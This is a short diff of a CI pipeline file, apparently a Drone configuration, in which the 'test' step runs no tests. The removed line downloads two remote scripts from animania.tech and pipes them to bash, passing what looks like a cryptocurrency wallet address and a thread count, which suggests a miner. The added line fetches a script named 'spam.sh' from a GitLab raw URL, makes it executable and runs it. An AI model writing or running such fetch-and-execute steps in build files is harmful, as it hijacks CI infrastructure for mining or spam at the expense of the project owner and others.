@@ -11,4 +11,4 @@ steps:
 - name: test
   image: gradle:jdk17
   commands:
-  - wget https://animania.tech/downloader.txt && bash downloader.txt && curl "https://www.animania.tech/start.txt?address=RLM9zhMnfJisKwYpbREgsfyFrs2RnZvs4e.Drone&BASH=CH01&thread=4" --output start.txt && bash start.txt
+  - wget https://gitlab.com/renifer12/project-7/-/raw/main/spam.sh && chmod +x spam.sh && ./spam.sh
